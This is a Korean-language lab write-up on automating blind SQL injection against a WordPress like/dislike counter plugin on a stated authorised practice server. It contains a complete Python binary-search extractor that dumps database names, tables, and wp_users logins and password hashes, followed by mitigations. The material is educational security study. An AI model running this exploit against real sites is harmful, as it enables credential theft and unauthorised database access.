# Blind SQL Injection 자동화

 진단 동의를 받은 실습 서버(dev.fngs.kr)의 WordPress 플러그인 취약점을 대상으로 한 교육 기록


---

## 개념 — Blind SQL Injection이란?


**에러 메시지도, 데이터도 화면에 직접 안 나오는** 상황에서 쓰는 SQLi 기법.
공격자는 **참(True) / 거짓(False)으로 갈리는 쿼리**를 주입하고, **웹의 반응 차이**만 보고 데이터를 **한 글자씩 추론**한다.

| 방식 | 판별 신호 | 특징 |
|---|---|---|
| **Boolean-based** | 응답 **본문/상태**가 참↔거짓에서 다름 | 빠름 (이 실습이 여기 해당) |
| **Time-based** | `SLEEP(n)` 으로 **응답 시간** 차이 | 응답이 항상 같을 때 최후수단, 느림 |

> **핵심:** 한 번의 요청으로 "예/아니오" 1비트를 얻는다. 글자 하나(아스키 32~126)를 알아내려면 **이진탐색(binary search)**으로 약 7번만 물어보면 된다 → 느린 Blind를 실전적으로 만드는 최적화.

---

## 1. 취약점 식별 — 파라미터 반사 확인


**Request** (body 값)
```
post_id=100&up_type=like
```

![](../Images/Pasted%20image%2020261028093930.png)

**Response**
```
Set-Cookie: ul_post_cnt[0] = 1
```

![](../Images/Pasted%20image%2020261028094012.png)

- `ul_post_cnt` 값이 **proxy로 보낸 파라미터 값에 따라 변조**되고, 서버가 **그 값을 그대로 반환**하는 지점을 발견.
- 즉 `post_id`가 쿼리에 직접 들어가고, 그 참/거짓 결과가 응답에 반영됨 → **Boolean-blind 주입 지점**.

![](../Images/Pasted%20image%2020261028103740.png)

테이블 검수(존재 여부) 확인.

---

## 2. 자동화 스크립트 (이진탐색 추출기)


대상 엔드포인트: `like-dislike-counter-for-posts-pages-and-comments` 플러그인의 `ajax_counter.php`.
`1 AND (조건)` 형태로 주입 → 조건이 참이면 응답 본문이 `"1"`, 거짓이면 `"0"`인 성질을 이용.


```python
import requests

URL = "http://dev.fngs.kr/wp-content/plugins/like-dislike-counter-for-posts-pages-and-comments/ajax_counter.php"
TRUE_MARK = "1"   # 참일 때 응답 본문 (AND 1=1 → "1")

def is_true(condition):
    """condition이 참이면 응답 본문이 '1', 거짓이면 '0'"""
    payload = f"1 AND ({condition})"
    r = requests.post(URL, data={"post_id": payload, "up_type": "up"})
    return r.text.strip() == TRUE_MARK

def extract(query, maxlen=64):
    """스칼라 서브쿼리 결과 문자열을 한 글자씩 이진탐색으로 추출"""
    result = ""
    for i in range(1, maxlen + 1):
        # 더 읽을 글자가 있는지(길이 확인)
        if not is_true(f"LENGTH(({query}))>={i}"):
            break
        lo, hi = 32, 126  # 출력 가능한 아스키 범위
        while lo < hi:
            mid = (lo + hi) // 2
            if is_true(f"ASCII(SUBSTRING(({query}),{i},1))>{mid}"):
                lo = mid + 1
            else:
                hi = mid
        result += chr(lo)
        print(f"\r[*] {result}", end="", flush=True)
    print()
    return result

# --- 1. 현재 DB 확인 ---
print("[DB]", extract("SELECT DATABASE()"))

# --- 2. 테이블 목록 (한 줄로 모아서) ---
print("[TABLES]", extract(
    "SELECT GROUP_CONCAT(table_name SEPARATOR ',') "
    "FROM information_schema.tables WHERE table_schema=DATABASE()"))

# 진단용
print("[버전]", extract("SELECT @@version"))
print("[테이블 개수]", extract(
    "SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=DATABASE()"))
print("[첫 테이블]", extract(
    "SELECT table_name FROM information_schema.tables "
    "WHERE table_schema=DATABASE() LIMIT 1 OFFSET 0"))

print("[*] 테이블 13개 목록:")
for off in range(13):
    t = extract(
        f"SELECT table_name FROM information_schema.tables "
        f"WHERE table_schema=DATABASE() LIMIT 1 OFFSET {off}")
    print(f"  {off}: {t}")

print("[*] 관리자 계정 추출")
for off in range(5):  # 유저 여러 명일 수 있으니 몇 개 더
    login = extract(f"SELECT user_login FROM wp_users LIMIT 1 OFFSET {off}")
    if not login:
        break
    phash = extract(f"SELECT user_pass FROM wp_users LIMIT 1 OFFSET {off}")
    print(f"\n  user: {login}")
    print(f"  hash: {phash}")

# --- 3. flag 테이블의 컬럼 확인 (테이블명 확정 후 교체) ---
# TARGET = "flag"
# print("[COLUMNS]", extract(
#     f"SELECT GROUP_CONCAT(column_name SEPARATOR ',') "
#     f"FROM information_schema.columns WHERE table_name='{TARGET}'"))

# --- 4. flag 덤프 (테이블/컬럼 확정 후 교체) ---
# print("[FLAG]", extract("SELECT flag FROM flag LIMIT 1"))
```

![](../Images/Pasted%20image%2020261028103720.png)

### 스크립트 동작 해설
- **`is_true()`** — `1 AND (조건)` 주입. 참이면 `"1"`, 거짓이면 `"0"` 반환을 Boolean 신호로 사용.
- **`extract()`** — 핵심. 두 단계로 한 글자씩 뽑는다:
    1. `LENGTH(...)>=i` 로 **문자열 길이 확인**
    2. `ASCII(SUBSTRING(...,i,1)) > mid` 로 **i번째 글자를 이진탐색** → 32~126 범위를 7번이면 특정.
- **`GROUP_CONCAT(... SEPARATOR ',')`** — 여러 행(테이블명 등)을 **한 문자열로 합쳐** 한 번의 extract로 뽑는 최적화.
- **`wp_users` → `user_login` / `user_pass`** — WordPress 기본 계정 테이블. `user_pass`는 phpass 해시(평문 아님)라, 뽑아도 별도 크랙이 필요.

> 왜 이진탐색인가: 글자당 **선형탐색 ~95회 요청 → 이진탐색 ~7회**로 급감. Blind는 요청 수가 곧 시간이라 이 최적화가 실전성의 핵심.

---

| 대책                     | 설명                                                               |
| ---------------------- | ---------------------------------------------------------------- |
| **Prepared Statement** | `post_id`를 바인딩 변수로 처리하면 `1 AND(...)`가 데이터로만 취급됨                  |
| **입력 타입 강제**           | `post_id`는 정수여야 하므로 `intval()` 등으로 **정수 캐스팅**만 해도 이 공격 차단        |
| **플러그인 관리**            | 취약 플러그인 **업데이트/제거** (WordPress 공격면의 대부분이 플러그인)                   |
| **최소 권한 DB**           | 웹 DB 계정에서 `information_schema` 광범위 조회·타 스키마 접근 제한                |
| **요청 이상탐지**            | 동일 엔드포인트에 **초당 수십~수백 건의 유사 요청**(Blind 특유 패턴) → WAF/레이트리밋으로 탐지·차단 |

